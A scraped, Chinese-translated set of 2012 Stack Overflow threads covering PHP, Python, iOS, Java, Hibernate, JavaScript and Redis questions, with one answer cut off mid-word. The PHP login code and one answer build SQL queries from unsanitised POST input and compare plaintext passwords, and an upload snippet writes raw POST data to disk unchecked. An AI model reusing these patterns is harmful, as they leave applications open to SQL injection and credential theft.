if ( isset ( $GLOBALS["HTTP_RAW_POST_DATA"] ) && isset ( $_GET['name'] ) ) {

//the image file name
$fileName = time();

// get the binary stream
$im = $GLOBALS["HTTP_RAW_POST_DATA"];

//write it
$fp = fopen($fileName, 'wb');
fwrite($fp, $im);
fclose($fp);
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:42:17.313

`}`我立即注意到的一件事是，您的最后一个`for`语句中没有闭括号。这是复制粘贴错误吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T21:38:59.980

[http://code.google.com/p/in-spirit/wiki/MultipartURLLoader](http://code.google.com/p/in-spirit/wiki/MultipartURLLoader)

注意这个链接。它允许每个请求上传多个图像。

================

用法：

[http://blog.inspirit.ru/?p=139](http://blog.inspirit.ru/?p=139)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-01T13:08:02.417

虽然自从你问到现在已经很久了：只需将 i 的初始值更改为 0 和 eve

# python - 尝试使用 asin() 时错误提示未定义名称“math”

> ID：10676896
> 
> 赞同：4
> 
> 时间：2012-05-20T20:22:38.823
> 
> 标签：python

我做了一个三角计算器（有点——它现在只使用正弦比）但我不能让它正常工作。我收到一个错误，说数学在应该得到行的长度时没有定义。这是我的代码：

```
 trig = raw_input ('What are you looking for? A) I have the opposite, and I want the        Hypotenuse. ')
    if trig.lower() == 'a':
        ang = raw_input ('Please enter the measure of the angle you have ')
        line = raw_input ('Please enter the length of the opposite! ')
        math.asin (ang)*line 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-20T20:24:23.050

在使用它之前你需`import math`要这样做——否则 Python 不知道你在说什么。

一旦你这样做了，你会得到另一个错误：你的输入是字符串，你需要将它们转换为数字（带`float()`），然后才能将它们作为参数传递给数学函数。正如[nye17 指出的那样](https://stackoverflow.com/a/10676908/344821)，如果用户以度为单位输入角度，您还需要将其转换为弧度，然后再将其传递给`asin`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-20T20:27:08.697

修正版。你的数学也错了，但我没有做你所有的功课；-)

```
import math
trig = raw_input ('What are you looking for? A) I have the opposite, and I want the Hypotenuse. ')
if trig.lower() == 'a':
    ang = float(raw_input ('Please enter the measure of the angle you have '))
    line = float(raw_input ('Please enter the length of the opposite! '))
    print "answer is", math.asin(ang)*line 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-20T20:25:24.330

您需要导入数学模块：`import math`

# iphone - 使用 AFNetworking 和 cancelAllHTTPOperationsWithMethod 取消下载不起作用

> ID：10676897
> 
> 赞同：2
> 
> 时间：2012-05-20T20:22:39.557
> 
> 标签：iphone, ios, networking, afnetworking

我无法使用 AFNetworking 取消下载。在我的应用中，用户可以通过这种方式触发单部电影下载：

```
NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:urlString]];
AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];

[operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject)
                                         {
                                             //do success stuff

                                         }
                                 failure:^(AFHTTPRequestOperation *operation, NSError *error)
                                         {
                                             NSLog(@"Error downloadMovie: %@", error);
                                         }];
[operation start]; 
```

这很好用。但是如何强制停止下载？我阅读了有关使用此方法的信息：

```
cancelAllHTTPOperationsWithMethod 
```

如果我以这种方式使用它，它不会做任何事情：

```
AFHTTPClient *client = [[AFHTTPClient alloc] initWithBaseURL:@"http://www.xyz/mymovie.mp4"];
[client cancelAllHTTPOperationsWithMethod:nil path:@"http://www.xyz/mymovie.mp4"]; 
```

取消下载的正确方法是什么？

提前谢谢了。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-22T03:43:17.463

`AFHTTPRequestOperation`是 的子类`NSOperation`，它有一个`-cancel`方法。用那个。

# database-design - 数据库模式设计困难

> ID：10676901
> 
> 赞同：-1
> 
> 时间：2012-05-20T20:23:59.237
> 
> 标签：database-design, ms-access-2007, database-schema

![在此处输入图像描述](../Images/9fed107b474550e99623a24c60c89d81.png)

你好，我有类似结构的数据库，现在我需要改进它，通过制作新的平板电脑“联系人”并将“客户”和“员工”表中的电话号码放入其中。但是我无法想象该怎么做，我尝试了类似的方法，但没有一个给我正确的答案。（它必须是一对多的，比如客户或员工能够有很多数字）也许有人你们能帮我做吗？我正在与 MS Access 合作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:41:17.567

你省略了你有什么其他要求。它必须是一张桌子还是仅仅是一张临时结合两者的桌子？它是否正在替换您现有的表格？

在两个现有表之间创建联合查询。这是通用联系人列表的最快方式。您可能需要创建一个计算字段来创建可以在联合中组合的唯一索引。

祝你好运！

# java - 如何使用三角函数绘制椭圆曲线？

> ID：10676902
> 
> 赞同：2
> 
> 时间：2012-05-20T20:24:20.153
> 
> 标签：java, trigonometry

如何在不使用任何标准图形库函数（如`Ellipse()`or ）的情况下使用 Java 绘制椭圆弧`Path()`？我需要做的最接近的想法是[Elliptical Arc using Trigonometric Method](http://www.syntax-example.com/Code/draw-elliptical-arc-trigonometric-670.aspx)，但它只显示随机弧，这不是事情应该发展的方式。

我想的方式是：用两点指定椭圆，然后指定角度，将从这个椭圆中切出（反之亦然）。对于绘制椭圆，我使用了 Bresenham 的算法，但由于镜像，它不能用于弧。先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:34:44.230

1.  根据角度找到椭圆的参数方程。
2.  从起始角度到第二个角度（绘制每个 x,y 对）。
3.  ？？？
4.  利润。

椭圆的参数方程为：

x = cos(角度) * 宽度/2 + xCenter

y = sin(Angle) * height/2 + yCenter

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:41:07.177

你应该从参数方程看。例如，要画一个圆，您首先应该知道圆的公式：

> x^2 + y^2 = R^2

其中R是圆的无线电。

现在你应该根据角度（从 1 到 360）来写这个公式。基于圆内的矩形三角形，其三角公式为：

cos(t)^2 + sin(t)^2 = R^2

其中 t 是角度，cos(t) 为 X，sin(t) 为 Y。

所以，要画一个圆圈，你只需要传递你的圆圈的收音机：

```
public static void drawCircle(int radio, double xCenter, double yCenter) {
    double t = 0;
    double xPoint;
    double yPoint;
    double xActual = xCenter;
    double yActual = yCenter + radio*sin(0);
    t += 0.01;
    while(t < 360) {
        xPoint = xCenter + radio*cos(t);
        yPoint = yCenter + radio*sin(t);
        //you should write this function based on
        //the platform you're working (Swing, AWT...)
        drawLine(xActual, yActual, xPoint, yPoint);
        t += 0.01;
        xActual = xPoint;
        yActual = yPoint;
    }
} 
```

您应该查看需要绘制的图形的参数公式：

[椭圆](http://en.wikipedia.org/wiki/Ellipse)

# javascript - 根据代码中存在的单词/url 显示 CSS/HTML

> ID：10676917
> 
> 赞同：0
> 
> 时间：2012-05-20T20:26:39.140
> 
> 标签：javascript, html, css, search

我一直在寻找这个，但我没有找到任何我想在我的网站上实现的东西。

这个想法是，如果代码中存在或不存在单词或 url，则显示一些 html 代码或更改一些 css 内容。例如，如果我想显示一个小部件，如果`banana`它不在代码中......或者如果 url`http://bleble/tagged/banana`不在代码中......？我该怎么做呢？

我想它必须使用 javascript 和条件，但我只知道 CSS+HTML。

在此先感谢并为我的英语感到抱歉。

```
window.onload = function() {
// Funcion hecha por Welele antes de usarla pide permiso.
var enlaces = document.getElementsByTagName("a");var contador = 0;
for(var i=0; i<enlaces.length; i++) 
{
if(enlaces[i].href == "http://welele.es/tagged/azas" || enlaces[i].href == "http://welele.es/tagged/azas/") 
    { contador++;}
    if(contador>2){break;}        
}
if(contador>2){$('#goviral').addClass('oculto');}} 
```

这个想法是..如果 contador （计数器）大于 2 类 oculto 将被添加到 goviral id （oculto 类是 .oculto {display:none} ）并且它的工作......;）我想这不是最高效的代码是可能的，但这是我的第一个 javascript。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:28:20.417

```
var txt = document.querySelector("textarea").value; // pretending the string is
                                                    // from a <textarea>
if(txt.search(/banana/i)==-1){
    //show widget
}

// -or-

var key = new RegExp("http://bleble/tagged/banana","i");
if(txt.search(key)==-1){
    //show widget
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T21:38:05.137

将 JavaScript 用于函数式操作并不是最佳实践。

您的网站会单独使用 HTML CSS 吗？

您是否使用 CMS，如果是，您可以执行一些服务器端脚本。

# iphone - Objective-c EXC_BREAKPOINT (SIGTRAP) 异常，没有回溯到 iPhone 应用程序

> ID：10676927
> 
> 赞同：1
> 
> 时间：2012-05-20T20:27:58.920
> 
> 标签：iphone, objective-c

我尝试过
（1）清理构建文件夹，
（2）从模拟器和我的 iphone 中删除应用程序，
（3）重新启动，
（4）并启用 NSZombieEnabled 但它似乎没有做任何事情。
(5)使用调试器lldb和gdb
(6)和gaurd malloc

我有 xcode 4.3.2。这个错误发生在模拟器和我的 iPhone 上。（在它说的模拟器和它说`EXC_BAD_INSTRUCTION code=i386 subcode=0x0`的设备上`EXC_BREAKPOINT (SIGTRAP)`。
这是两个崩溃日志：

[http://pastie.org/3941419](http://pastie.org/3941419)

[http://pastie.org/3941427](http://pastie.org/3941427)

在日志中打印：

`Trace/BPT trap: 5`
`Segmentation fault: 11`

正如您在崩溃中看到的那样，我的任何 ViewController 都没有回溯。[在询问（链接](https://www.google.com/#hl=en&output=search&sclient=psy-ab&q=exc_breakpoint+%28sigtrap%29+site:stackoverflow.com&oq=exc_breakpoint+%28sigtrap%29+site:stackoverflow.com)）之前我做了很多谷歌搜索，但是很多其他人（[链接](https://stackoverflow.com/questions/2611607/are-exc-breakpoint-sigtrap-exceptions-caused-by-debugging-breakpoints)）有这个错误可以追溯到他们的应用程序。这个应用程序的常见原因是什么，我应该从哪里开始寻找错误？我不能做任何事情来重现，只需运行我的一段代码 10 次，它至少会崩溃一次。谢谢！

编辑：继承人一些代码

`outputPipe = [[NSPipe alloc] init];`

`[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(getDataOut:) name:NSFileHandleReadToEndOfFileCompletionNotification object:[outputPipe fileHandleForReading]];`

`[[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleReadToEndOfFileCompletionNotification object:[outputPipe fileHandleForReading]];`

我稍后会在我的代码中发布 outputPipe。

编辑 2：更改 [NSPipe 管道]；到 [[NSPipe alloc] 初始化]；没有修复它。

在观察者之间切换的代码：

```
 buttondone.title=@"Done";
    //dlog(@"last output notification inbound");
    stdoutisdone=YES;

    [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleReadCompletionNotification object:[outputPipe fileHandleForReading]];

[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(getDataOut:) name:NSFileHandleReadToEndOfFileCompletionNotification object:[outputPipe fileHandleForReading]];

    [[outputPipe fileHandleForReading] readToEndOfFileInBackgroundAndNotify]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T18:32:43.323

我通过删除对第二个 NSFileHandle 方法的调用来解决它。所以，而不是这个：

```
 [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleReadCompletionNotification object:[outputPipe fileHandleForReading]];

[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(getDataOut:) name:NSFileHandleReadToEndOfFileCompletionNotification object:[outputPipe fileHandleForReading]];

[[outputPipe fileHandleForReading] readToEndOfFileInBackgroundAndNotify]; 
```

我用这个：

```
NSString * output=[[outputPipe fileHandleForReading] readToEndOfFile]; 
```

它确实会产生一点 UI 延迟，可以通过`readInBackgroundAndNotify`在任务完成后调用一次或两次来减少。如果有人有更好的解决方案，我会将您的标记为答案。

# hibernate - 为什么在 Servlet 中使用 UserTransaction 时 Hibernate 不写入更改？

> ID：10676928
> 
> 赞同：2
> 
> 时间：2012-05-20T20:28:08.403
> 
> 标签：hibernate, servlets, transactions, ejb, jta

使用休眠：

```
@PersistenceUnit(unitName = "oracle")
private EntityManagerFactory emf;
@Resource
private UserTransaction u;

protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
         EntityManager em = emf.createEntityManager();
try {
         u.begin();
         em.persist(some entity);
         u.commit();
     } catch (Exception e) {
         e.printStackTrace();
     } 
```

这不会向数据库写入任何内容，如果我切换到 EclipseLink 它可以正常工作。
如果我使用

```
EntityTransaction et = em.getTransaction(); 
```

而不是`UserTransaction`休眠写入数据库。（所以不知何故，hibernate 看不到 JTA，就像 EclipseLink 一样）。

休眠有什么问题？（4.0.0-Final）谢谢

编辑：

我添加了最后 2 个属性：（我正在使用 glassfish）

```
<properties>
    <property name="hibernate.dialect" value="org.hibernate.dialect.OracleDialect"/>
    <property name="hibernate.show_sql" value="true"/>
    <property name="hibernate.hbm2ddl.auto" value="create-drop"/>
    <property name="hibernate.transaction.factory_class" value="org.hibernate.transaction.JTATransactionFactory" />
    <property name="hibernate.transaction.manager_lookup_class" value="org.hibernate.transaction.SunONETransactionManagerLookup" />
</properties> 
```

但仍然不起作用

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T07:24:05.960

我删除了最后两个属性，因为它们不是必需的。
我的问题是我在 外部创建 EM `u.begin()`，我应该在事务或调用内部创建它`em.joinTransaction()`。

谢谢：

我从这里得到了答案： [Hibernate JPA with JTA and Glassfish Application Server 似乎没有提交](https://stackoverflow.com/questions/6895868/hibernate-jpa-with-jta-and-glassfish-application-server-doesnt-seem-to-commit)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T21:45:45.820

确保 Hibernate 将知道 JTA 事务管理器将自己登记为事务资源。

将 *hibernate.transaction.factory_class* 属性配置为*org.hibernate.transaction.JTATransactionFactory*并将 *hibernate.transaction.manager_lookup_class* 属性配置为您的服务器的事务管理器查找类，例如*org.hibernate.transaction.JBossTransactionManagerLookup*，或者实现您的通过从*org.hibernate.transaction.JNDITransactionManagerLookup*继承来拥有。

示例*hibernate.properties*：

```
hibernate.transaction.factory_class = org.hibernate.transaction.JTATransactionFactory
hibernate.transaction.manager_lookup_class = org.hibernate.transaction.JBossTransactionManagerLookup 
```

请参阅[Hibernate 参考文档，第 3.3 节。JDBC 连接](http://docs.jboss.org/hibernate/orm/4.1/manual/en-US/html/ch03.html#configuration-sessionfactory)了解更多信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-03T07:25:36.740

对我来说，它只有在我删除以下行后才开始正常工作：

```
<property name="hibernate.transaction.factory_class" value="org.hibernate.transaction.JTATransactionFactory" /> 
```

# javascript - Javascript + 修改字符串

> ID：10676930
> 
> 赞同：2
> 
> 时间：2012-05-20T20:28:22.760
> 
> 标签：javascript, jquery, regex

从第一个“点”开始，从字符串中删除“所有内容”的最快方法是什么。

例如：

```
This.Is.A.Test 
```

=> 会变成

```
This 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T20:29:41.553

您可以像这样使用该[`split()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/split)功能：

```
"This.Is.A.Test".split(".")[0]; // will work even if there are no dots 
```

或者您可以将`substr()`函数与函数结合使用`indexOf()`，如下所示：

```
var myStr = "This.Is.A.Test";
var justTheFirstBit = myStr.substr(0, myStr.indexOf(".")); // needs 1 dot minimum 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T20:33:54.800

或者，

```
var string = "This.Is.A.Test";
var newstring = string.substring(0, string.indexOf(".")); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T20:33:17.930

## 　　　　　　　　　　　　 ***[MDN - 替换（）](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/replace)***

* * *

您可以像这样使用该[`replace()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/replace)功能：

```
"This.Is.A.Test".replace(/\..+$/,""); 
```

这是您需要的正则表达式：

```
/\..+$/ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-20T20:34:42.303

这应该具有 O(2n) 的复杂性，并且应该搜索到第一个点（两次）。

```
​var a = "This.Is.String";
var ind = a.indexOf(".");
ind = ind == -1 ? a.length : ind;
​var b = a.substring(0, ind);
​ 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-20T20:37:15.400

```
$('#el').text( $('#el').text().split('.')[0] ); 
```

## *[演示](http://jsbin.com/ujaxoq/edit#javascript,html,live)*

[https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/split](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/split)

# php - PHP登录不会重定向到会员页面

> ID：10676936
> 
> 赞同：1
> 
> 时间：2012-05-20T20:28:57.627
> 
> 标签：php, html

我有一个 PHP 问题。我已经做了一个简单的登录系统，但是如果我登录它不会重定向到会员页面，它只会进入一个空白页面。登录有效，正如我尝试过的那样`echo("success")`。任何帮助将非常感激。

```
<?php
session_start();

$username = $_POST['username'];
$password = $_POST['password'];

if($username&&$password)
{
    $connect = mysql_connect("mysite","hidden","hidden") or die("Couldn't   connect");
    mysql_select_db("hidden") or die("Couldn't find db");   

    $query = mysql_query("SELECT * FROM users WHERE Username = '$username'");
    $numrows = mysql_num_rows($query);

    if($numrows!=0)
    {
        //code to login
        while($row = mysql_fetch_assoc($query))
        {
            //validate values
            $dbusername = $row['Username'];
            $dbpassword = $row['Password'];
        }
        //check to see if the values match
        if($username==$dbusername && $password==$dbpassword)
        {
            header('Location: memberHome.php');
            $_SESSION['username']=$dbusername;
        }
        else
            die("incorrect password");
    }
    else
        die("User doesn't exist");
}
else
    die("Please enter a username and a password");
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:34:27.530

```
header('Location: memberHome.php');
$_SESSION['username']=$dbusername; 
```

如果您希望分配会话变量，则必须在标题将您传递到下一页之前这样做；）像这样：

```
$_SESSION['username']=$dbusername;
header('Location: memberHome.php'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:45:03.117

与其先检查用户名是否存在，然后再检查密码是否正确，为什么不同时进行这两项操作呢？

```
 $row = mysql_fetch_assoc(mysql_query("SELECT * FROM users
    WHERE Username='$username' 
    AND pass='$password'"));

if($row['id']) { 
$_SESSION['username']=$dbusername;
header('Location: memberHome.php');
} 
```

此外，明智的做法是不要`*`在您的`SELECT`声明中使用。只选择您真正需要的项目。

我没有看到您的代码没有重定向的任何问题。

我只是在我的机器上用这个代码在本地尝试了它并取出你的数据库连接。但是使用下面提供的代码，我能够让它重定向到 memberHome.php，这表明如果用户名和密码匹配，那么它工作正常。

```
<?php
session_start();

$username = "david";
$password = "password";

if($username&&$password)
{
    //$connect = mysql_connect("mysite","hidden","hidden") or die("Couldn't   connect");
   //mysql_select_db("hidden") or die("Couldn't find db");   

    //$query = mysql_query("SELECT * FROM users WHERE Username = '$username'");
    $numrows = 1;

    if($numrows!=0)
    {

            //validate values
            $dbusername = "david";
            $dbpassword = "password";

        //check to see if the values match
        if($username==$dbusername && $password==$dbpassword)
        {
            header('Location: memberHome.php');
            $_SESSION['username']=$dbusername;
        }
        else
            die("incorrect password");
    }
    else
        die("User doesn't exist");
}
else
    die("Please enter a username and a password");
 ?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T20:35:38.863

你试过在头球后死吗？

```
$_SESSION['username']=$dbusername;
header('Location: memberHome.php');
die; 
```

# php - 检查上传的文件是否在 php 中属于不安全的文件类型

> ID：10676938
> 
> 赞同：1
> 
> 时间：2012-05-20T20:29:25.833
> 
> 标签：php, security, file, file-upload, file-processing

我有一个文件上传表单，需要对上传的文件进行检查，以确保它不是任何可能导致服务器出现问题的东西（即：可执行文件）。这些文件主要是图像，但我将处理原始文件格式的其他扩展，可以是许多不同的扩展名。所以，我觉得最简单的方法是检查不是我不想要的东西的列表，而不是我做的事情。

做这个的最好方式是什么？理想情况下，可以在 Windows 和 linux 服务器上运行的东西，但如果现在两者都适用，则主要是 linux。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:52:20.677

我建议您应该维护允许类型的白名单，而不是阻止类型的黑名单。尽管[将任何类型的基于文件扩展名的处理视为薄弱的防线](https://stackoverflow.com/questions/9360770/whitelist-or-blacklist-file-extensions-for-uploads)，因为绕过这种检查是微不足道的。

所以不要只检查文件扩展名。验证文件的内容类型是否与扩展名匹配可能值得 - 请参阅[Fileinfo](http://www.php.net/manual/en/function.finfo-file.php)扩展名。如果您只是使用图像，[则可以使用 GD 或 ImageMagick 重新处理文件。](https://stackoverflow.com/questions/9754047/image-upload-security-reprocess-with-gd)

最后，我建议您将任何上传的文件存储在不允许执行的文件系统上——在 Linux/UNIX 平台上使用 noexec 挂载——尽管请注意[在 Windows 上并没有真正的等价物](https://serverfault.com/questions/90135/noexec-option-on-ntfs-under-windows)。

# node.js - 监听 Redis 的变化？

> ID：10676951
> 
> 赞同：26
> 
> 时间：2012-05-20T20:31:49.477
> 
> 标签：node.js, redis

我希望能够在我的 redis 集合中进行任何更改时运行回调。回调将键和值作为输入。这样的事情可能吗？

谢谢？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-05-20T20:57:22.520

**更新**：无论谁在读这篇文章——这些都是古老的答案，**请忽略它们**。您需要的是已经存在多年的 Redis Keyspace Notifications。见[https://redis.io/topics/notifications](https://redis.io/topics/notifications)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-05-20T20:56:10.173

两种选择：

1.  使用[`MONITOR`](http://redis.io/commands/monitor)命令 - 它跟踪到达 Redis 的每个命令，您可以分析并查看何时触及您的集合。

2.  如果您“拥有”写入集合的代码，请向您的其他代码（您的回调）发出信号。您可以为此使用[Redis Pub/Sub](http://redis.io/topics/pubsub)频道。

**编辑**Redis 实际上将在 2.8 版本中实现此功能。请参阅 Antirez 的博客文章：[Redis 键空间更改通知系统](https://github.com/antirez/redis/issues/594)。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2012-05-21T02:48:38.400

您还可以使用同步命令像追随者一样连接到 Redis 服务器。查看[Redis 复制的工作原理？](http://redis.io/topics/replication)快速介绍。

同步命令的输出有两个阶段。在第一阶段，服务器返回数据库 dump.rdb 文件。一旦文件发送完毕，它就开始在 Redis 协议中发送命令，该协议也是 AOF 格式。

这是您可以做什么的高级图片：

1.  连接到 Redis 服务器并发出`SYNC`命令
2.  保存并解析 dump.rdb 文件。构建初始数据集。基于 node.js的[rdb 解析器](https://github.com/pconstr/rdb-parser)可用
3.  解析后面的命令。由于它们采用 Redis 协议，因此您可以从现有的 Redis 库开始。
4.  对于您收到的每个命令，调用回调

看起来工作量很大，但你应该能够很容易地破解它。它也将成为一个很好的开源库！

**编辑：同步 v/s 监视器**

1.  `Monitor`是一个调试命令。响应格式可以（并且已经）随着时间而改变（d）。`Sync`用于Master -> Slave的复制，所以会得到更好的支持
2.  `Monitor`将发出所有命令，包括只读命令。`Sync`只会让你修改数据的命令。
3.  `Monitor`将记录在 lua 脚本中执行的各个命令。`Sync`只会传输整个lua脚本，所以你必须自己解析脚本。这确实是一个交易破坏者`sync`。
4.  `Monitor`将记录不成功的`Sync`命令，只记录修改数据的命令。例如，该命令`del non-existing-key`将由监视器记录，但在您运行同步时不会显示。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2017-08-18T16:32:16.470

**2017年**

现在有一个可以与`node-redis`模块一起使用的发布/订阅机制。[请参阅此处](https://github.com/NodeRedis/node_redis#publish--subscribe)的特定文档。（也适用`redis-mock`于测试）

您可以有多个订阅者（听众）到同一个频道，在您的情况下，这将是您收藏的关键。

快速示例：（有关实施细节，请参阅上述文档）

```
sub.subscribe('myCollection');
sub.on('message', (channel, data) => {
    // this is the callback you talked about
    console.log(`${channel} is now ${data}`);
});

// ... later on ...

pub.publish('myCollection', [1,2,3])
// console will output:
// myCollection is now [1,2,3] 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-03-06T14:00:29.363

```
<dependency>
    <groupId>com.moilioncircle</groupId>
    <artifactId>redis-replicator</artifactId>
    <version>2.5.0</version>
</dependency> 
```

如果您使用的是 java. `redis-replicator`实现redis复制协议。更多细节请参考[参考资料](https://github.com/leonchen83/redis-replicator)

# javascript - JS Settype 类似 PHP

> ID：10676956
> 
> 赞同：-1
> 
> 时间：2012-05-20T20:32:26.650
> 
> 标签：javascript

我的 JS 上有变量`qty`，类型是字符串。怎么改成`integer or float`?

在 PHP 中我们有 settype，用 JS 尝试同样的方法。它不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T20:34:21.690

```
var qtyInt = parseInt(qty);
var qtyFloat = parseFloat(qty); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:36:27.693

将字符串转换为浮点数： var myFloat = parseFloat('77.3'); // 77.3

将字符串转换为整数： var myInt = parseInt('14'); // 14

# ios - 如何在游戏中显示 iOS GameCenter“仪表板”？

> ID：10676958
> 
> 赞同：1
> 
> 时间：2012-05-20T20:32:54.513
> 
> 标签：ios, cocos2d-iphone, game-center, gamekit, openfeint

**情况：**
我在 cocos2d 游戏中同时使用 OpenFeint/Game Center。OpenFeint 有一个可以在游戏中显示的“仪表板”，但我找不到 Game Center 的等价物。

**问题：**
我想知道如何在我的游戏中呈现 Game Center 的“仪表板”或主屏幕。我不想退出游戏。

**其他信息：**
GameKit 提供了几个有用的视图控制器*（GKAchievementViewController / GKLeaderboardViewController）*，用于显示游戏中的特定排行榜或成就，但我无法立即找到用于更通用仪表板或家庭类型屏幕的视图控制器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T08:57:47.227

GameCenter 没有“仪表板”视图。如果您想将排行榜、成就或其他信息组合在一个视图中，则必须自己设计。查看[有关自定义 Game Center 视图的 Game Center 文档](https://developer.apple.com/library/ios/documentation/NetworkingInternet/Conceptual/GameKit_Guide/Achievements/Achievements.html#//apple_ref/doc/uid/TP40008304-CH7-SW10)。

# heroku - heroku db:push 的“时区位移超出范围”，无法使用 ruby 1.9.2 解决

> ID：10676959
> 
> 赞同：3
> 
> 时间：2012-05-20T20:32:59.967
> 
> 标签：heroku, taps

这个问题已在其他地方提出，但似乎问题又回来了，以前的解决方案不再起作用。

异常输出类似于：

```
Saving session to push_201205201307.dat..
!!! Caught Server Exception
HTTP CODE: 500
Taps Server Error: PGError: ERROR:  time zone displacement out of range: "2012-05-09 12:00:00.000000+5894536800" 
```

我在 ubuntu 12.04 上运行 postgresql 9.1，并使用 heroku cedar。

其他问题，例如[将数据推送到 Heroku 时出错：时区位移超出范围](https://stackoverflow.com/questions/8151571/error-when-pushing-data-to-heroku-time-zone-displacement-out-of-range)表明使​​用 rvm 切换到 1.9.2-p290 将匹配在 heroku 上运行的版本，避免该问题对我不起作用。

清空表中的值允许我推送数据，但我正在寻找的不仅仅是一次性解决方法。

[pgbackups](https://devcenter.heroku.com/articles/pgbackups)似乎可以工作，但我宁愿不设置另一个完整的过程来使用 db:push 解决方法。

有什么建议么？这实际上是水龙头问题吗？这里的人似乎有不同的结果：[https ://github.com/ricardochimal/taps/issues/92](https://github.com/ricardochimal/taps/issues/92)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T00:42:02.893

经过数小时的挫败后才开始工作。我很失望 jfeust 没有给出对他有用的宝石的标签。

我有一个 pg 数据库，所以：

`$rvm requirements`

（在它们给你带来麻烦之前安装依赖项和库，你不知道为什么）

```
$rvm install 1.9.2-p318
$gem install heroku -v '2.2.8' --no-ri --no-rdoc
$gem install taps pg --no-ri --no-rdoc` 
```

为了记录，我的水龙头是（0.3.24）和pg（0.14.1）

```
$rvm use 1.9.2-p318 
```

这对我有用。

```
$~/.rvm/gems/ruby-1.9.2-p318/gems/heroku-2.2.8/bin/heroku db:push 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T22:55:31.313

只是更改 ruby​​ 版本对我不起作用。使用较旧的 heroku gem 时，我可以运行“heroku db:push”。我基本上为此创建了一个新的 gemset，并确保它使用的是 heroku 的 gem 版本（而不是 toolbelt），并且一切运行良好。希望 heroku 尽快解决这个问题，因为我是 db:push/pull 开发的忠实粉丝。

# ios - 一台 Mac 上的两个 iOS 开发者许可证

> ID：10676961
> 
> 赞同：5
> 
> 时间：2012-05-20T20:33:15.887
> 
> 标签：ios, keychain, certificate, iphone-developer-program

在我的 Mac 上，我已经安装了所需的证书和密钥，以通过我自己的 iOS 开发者许可证开发和分发我自己开发的 iOS 应用程序。但是，我的客户希望我使用他的许可证来分发（Ad-Hoc）测试版并最终将应用程序分发到应用程序商店。

请你告诉我如何在我的 Mac 上安装他的开发者许可证而不影响我的个人开发者证书和已经安装在我的 Mac 上的密钥？

此外，这甚至可能吗？

编辑 - -

对不起，我没有提到；我不想撤销我的客户在他的开发者帐户上预先存在的证书。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-22T22:02:39.743

与其中一条评论相反，您无法从 Apple 下载密钥 - 它们仅存在于他的计算机上。您只能从 Apple 下载配置文件。因此，如果您不想撤销他现有的分发密钥，他将需要从他的计算机中导出它们。

他可以通过进入 Keychain Access -> My Certificates 并查找名为“iPhone Distribution: My Company Name”的条目来执行此操作。然后右键单击它并选择“导出...”。

然后他可以将该文件发送给您，您可以双击该文件将其导入您自己的钥匙串。

在您的计算机上拥有多个密钥很好 - 它不应该影响您的个人帐户。

# c - 请解释这个素数生成器代码是如何工作的（在 C 中）

> ID：10676966
> 
> 赞同：0
> 
> 时间：2012-05-20T20:33:48.293
> 
> 标签：c, for-loop, primes

```
int prime (int poss_prime);  

int main() {  

    int poss_prime;  

    for (poss_prime = 2; poss_prime <= MAX_INT; poss_prime++) {  
        if (prime (poss_prime)) {  
            printf("%d ", poss_prime);  
        }  
    }  

    printf("\n\n");  
    return 0;  
}  

int prime (int poss_prime) {  

